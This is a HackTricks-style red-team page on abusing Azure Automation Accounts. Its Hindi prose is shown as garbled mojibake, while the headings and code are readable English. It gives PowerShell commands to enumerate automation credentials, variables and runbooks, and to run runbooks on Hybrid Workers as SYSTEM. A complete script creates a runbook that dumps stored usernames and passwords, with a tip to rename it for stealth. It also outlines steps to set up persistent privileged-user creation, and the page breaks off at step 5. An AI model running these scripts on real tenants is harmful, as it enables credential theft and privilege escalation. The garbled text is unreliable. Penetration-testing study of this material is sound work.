# Az - Automation Account

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/azure/automation/overview) Azure Automation ‡§è‡§ï ‡§ï‡•ç‡§≤‡§æ‡§â‡§°-‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§®, ‡§ë‡§™‡§∞‡•á‡§ü‡§ø‡§Ç‡§ó ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§Ö‡§™‡§°‡•á‡§ü ‡§î‡§∞ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•á Azure ‡§î‡§∞ ‡§ó‡•à‡§∞-Azure ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§≤‡§ó‡§æ‡§§‡§æ‡§∞ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§®, ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§®, ‡§Ö‡§™‡§°‡•á‡§ü ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§®, ‡§∏‡§æ‡§ù‡§æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Å ‡§î‡§∞ ‡§µ‡§ø‡§∑‡§Æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§è‡§Å ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç‡•§

‡§Ø‡•á Azure ‡§Æ‡•á‡§Ç "**‡§®‡§ø‡§∞‡•ç‡§ß‡§æ‡§∞‡§ø‡§§ ‡§ï‡§æ‡§∞‡•ç‡§Ø**" ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•ã **‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§**, ‡§ú‡§æ‡§Ç‡§ö‡§®‡•á ‡§î‡§∞ **Azure ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£** ‡§ï‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ö‡•Ä‡§ú‡•á‡§Ç (‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§è‡§Å ‡§Ø‡§æ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü) ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç‡§ó‡•á‡•§

### Run As Account

‡§ú‡§¨ **Run as Account** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π ‡§è‡§ï Azure AD **‡§ê‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§®** ‡§¨‡§®‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§µ‡§Ø‡§Ç-‡§π‡§∏‡•ç‡§§‡§æ‡§ï‡•ç‡§∑‡§∞‡§ø‡§§ ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§™‡§§‡•ç‡§∞ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§è‡§ï **‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§Æ‡•Å‡§ñ** ‡§¨‡§®‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® ‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ** ‡§Æ‡•á‡§Ç ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **Contributor** ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§∏‡•å‡§Ç‡§™‡§§‡§æ ‡§π‡•à (‡§ï‡§à ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞)‡•§\
Microsoft ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **Managed Identity** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§∏‡§ø‡§´‡§æ‡§∞‡§ø‡§∂ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

{% hint style="warning" %}
‡§Ø‡§π **30 ‡§∏‡§ø‡§§‡§Ç‡§¨‡§∞, 2023 ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ Managed Identities ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§¶‡§≤‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§**
{% endhint %}

## Runbooks & Jobs

**Runbooks** ‡§Ü‡§™‡§ï‡•ã **‡§Æ‡§®‡§Æ‡§æ‡§®‡•á PowerShell** ‡§ï‡•ã‡§° ‡§ï‡•ã **‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§** ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏‡§ï‡§æ **‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞** ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **‡§∏‡§Ç‡§≤‡§ó‡•ç‡§® ‡§™‡•ç‡§∞‡§Æ‡•Å‡§ñ** ‡§ï‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§ö‡•Å‡§∞‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§π‡•ã)‡•§\
**Runbooks** ‡§ï‡•á **‡§ï‡•ã‡§°** ‡§Æ‡•á‡§Ç ‡§Ü‡§™ **‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä** (‡§ú‡•à‡§∏‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏) ‡§≠‡•Ä ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§ú‡•â‡§¨‡•ç‡§∏** ‡§ï‡•ã **‡§™‡§¢‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**, ‡§§‡•ã ‡§ê‡§∏‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§µ‡•á ‡§∞‡§® ‡§ï‡§æ **‡§Ü‡§â‡§ü‡§™‡•Å‡§ü** **‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç** (‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ **‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä**).

‡§ú‡§æ‡§è‡§Å `Automation Accounts` --> `<Select Automation Account>` --> `Runbooks/Jobs/Hybrid worker groups/Watcher tasks/credentials/variables/certificates/connections`

### Hybrid Worker

‡§è‡§ï Runbook ‡§ï‡•ã **Azure ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§è‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§Æ‡•á‡§Ç ‡§Ø‡§æ **Hybrid Worker** (‡§ó‡•à‡§∞-Azure ‡§Æ‡§∂‡•Ä‡§®) ‡§Æ‡•á‡§Ç ‡§ö‡§≤‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§\
**Log Analytics Agent** ‡§ï‡•ã VM ‡§™‡§∞ ‡§§‡•à‡§®‡§æ‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§á‡§∏‡•á ‡§è‡§ï ‡§π‡§æ‡§á‡§¨‡•ç‡§∞‡§ø‡§° ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§\
‡§π‡§æ‡§á‡§¨‡•ç‡§∞‡§ø‡§° ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡§∞‡•ç‡§§‡§æ ‡§ú‡•â‡§¨‡•ç‡§∏ **SYSTEM** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç Windows ‡§™‡§∞ ‡§î‡§∞ **nxautomation** ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç Linux ‡§™‡§∞ ‡§ö‡§≤‡§§‡•Ä ‡§π‡•à‡§Ç‡•§\
‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§π‡§æ‡§á‡§¨‡•ç‡§∞‡§ø‡§° ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã **Hybrid Worker Group** ‡§Æ‡•á‡§Ç ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§Ü‡§™ **Windows Hybrid Worker** ‡§Æ‡•á‡§Ç ‡§è‡§ï **Runbook** ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡§æ ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ ‡§ö‡•Å‡§® ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ **System** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§¨‡§æ‡§π‡§∞‡•Ä ‡§Æ‡§∂‡•Ä‡§® ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ **‡§Æ‡§®‡§Æ‡§æ‡§®‡•á ‡§Ü‡§¶‡•á‡§∂** ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á (‡§Ö‡§ö‡•ç‡§õ‡•Ä ‡§™‡§ø‡§µ‡§ü ‡§§‡§ï‡§®‡•Ä‡§ï)‡•§

## Compromise State Configuration (SC)

[From the docs:](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview) Azure Automation **State Configuration** ‡§è‡§ï Azure ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§∏‡•á‡§µ‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•ã PowerShell Desired State Configuration (DSC) [‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§®](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) ‡§≤‡§ø‡§ñ‡§®‡•á, ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§∏‡§Ç‡§ï‡§≤‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§ï‡•ç‡§≤‡§æ‡§â‡§° ‡§Ø‡§æ ‡§ë‡§®-‡§™‡•ç‡§∞‡§ø‡§Æ‡§æ‡§á‡§∏‡•á‡§∏ ‡§°‡•á‡§ü‡§æ ‡§ï‡•á‡§Ç‡§¶‡•ç‡§∞ ‡§Æ‡•á‡§Ç ‡§®‡•ã‡§°‡•ç‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡•á‡§µ‡§æ [DSC Resources](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources) ‡§ï‡•ã ‡§≠‡•Ä ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à, ‡§î‡§∞ ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§®‡•ã‡§°‡•ç‡§∏ ‡§ï‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§∏‡•å‡§Ç‡§™‡§§‡•Ä ‡§π‡•à, ‡§∏‡§≠‡•Ä ‡§ï‡•ç‡§≤‡§æ‡§â‡§° ‡§Æ‡•á‡§Ç‡•§ ‡§Ü‡§™ Azure ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤ ‡§Æ‡•á‡§Ç **Configuration Management** ‡§ï‡•á ‡§§‡§π‡§§ **State configuration (DSC)** ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞‡§ï‡•á Azure Automation State Configuration ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§á‡§® ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§Æ‡•á‡§Ç **‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä** ‡§Æ‡§ø‡§≤ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

### RCE

‡§Ø‡§π ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§Æ‡§∂‡•Ä‡§®‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§Æ‡§®‡§Æ‡§æ‡§®‡•á ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è SC ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## Enumeration

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### ‡§è‡§ï ‡§∞‡§®‡§¨‡•Å‡§ï ‡§¨‡§®‡§æ‡§è‡§Ç

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### ‡§è‡§ï ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§Ö‡§ï‡§æ‡§â‡§Ç‡§ü ‡§Æ‡•á‡§Ç ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§î‡§∞ ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§∞‡§® ‡§¨‡•Å‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï‡•ç‡§∏‡§´‡§ø‡§≤‡•ç‡§ü‡•ç‡§∞‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç

{% code overflow="wrap" %}
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% endcode %}

{% hint style="info" %}
‡§Ü‡§™ ‡§è‡§ï ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ‡§∞‡§® ‡§¨‡•Å‡§ï ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á ‡§î‡§∞ ‡§µ‡•á‡§¨ ‡§ï‡§Ç‡§∏‡•ã‡§≤ ‡§∏‡•á ‡§µ‡§π‡•Ä ‡§ï‡§æ‡§Æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
{% endhint %}

### ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§â‡§ö‡•ç‡§ö ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§ø‡§∞‡•ç‡§Æ‡§æ‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•á‡§ü‡§Ö‡§™ ‡§ï‡•á ‡§ö‡§∞‡§£

#### 1. ‡§è‡§ï ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§ñ‡§æ‡§§‡§æ ‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠ ‡§ï‡§∞‡•á‡§Ç

* **‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ:** ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§ñ‡§æ‡§§‡§æ ‡§¨‡§®‡§æ‡§è‡§Ç‡•§
* **‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó:** ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§ï‡§ø "Create Azure Run As account" ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à‡•§

#### 2. ‡§∞‡§®‡§¨‡•Å‡§ï ‡§Ü‡§Ø‡§æ‡§§ ‡§î‡§∞ ‡§∏‡•á‡§ü‡§Ö‡§™ ‡§ï‡§∞‡•á‡§Ç

* **‡§∏‡•ç‡§∞‡•ã‡§§:** [MicroBurst GitHub Repository](https://github.com/NetSPI/MicroBurst) ‡§∏‡•á ‡§®‡§Æ‡•Ç‡§®‡§æ ‡§∞‡§®‡§¨‡•Å‡§ï ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§è‡§Å:**
* ‡§∞‡§®‡§¨‡•Å‡§ï ‡§ï‡•ã ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡•á‡§Ç‡•§
* ‡§á‡§∏‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∞‡§®‡§¨‡•Å‡§ï ‡§™‡•ç‡§∞‡§ï‡§æ‡§∂‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç‡•§
* ‡§¨‡§æ‡§π‡§∞‡•Ä ‡§ü‡•ç‡§∞‡§ø‡§ó‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∞‡§®‡§¨‡•Å‡§ï ‡§∏‡•á ‡§è‡§ï ‡§µ‡•á‡§¨‡§π‡•Å‡§ï ‡§∏‡§Ç‡§≤‡§ó‡•ç‡§® ‡§ï‡§∞‡•á‡§Ç‡•§

#### 3. AzureAD ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡•á‡§Ç

* **‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ:** ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç AzureAD ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§ú‡•ã‡§°‡§º‡•á‡§Ç‡•§
* **‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§ï‡§¶‡§Æ:** ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§ï‡§ø ‡§∏‡§≠‡•Ä Azure ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§â‡§®‡§ï‡•á ‡§®‡§µ‡•Ä‡§®‡§§‡§Æ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§Ö‡§™‡§°‡•á‡§ü ‡§π‡•à‡§Ç‡•§

#### 4. ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Ö‡§∏‡§æ‡§á‡§®‡§Æ‡•á‡§Ç‡§ü

* **‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§è‡§Å:**
* ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï
* ‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Æ‡§æ‡§≤‡§ø‡§ï
* **‡§≤‡§ï‡•ç‡§∑‡•ç‡§Ø:** ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§® ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§ë‡§ü‡•ã‡§Æ‡•á‡§∂‡§® ‡§ñ‡§æ‡§§‡•á ‡§ï‡•ã ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§∞‡•á‡§Ç‡•§

#### 5. ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡§π‡•Å‡§Ç‡§ö ‡§π‡§æ‡§®‡§ø ‡§ï‡•á ‡§™‡•ç‡§∞‡§§‡§ø ‡§ú‡§æ‡§ó‡§∞‡•Ç‡§ï‡§§‡§æ

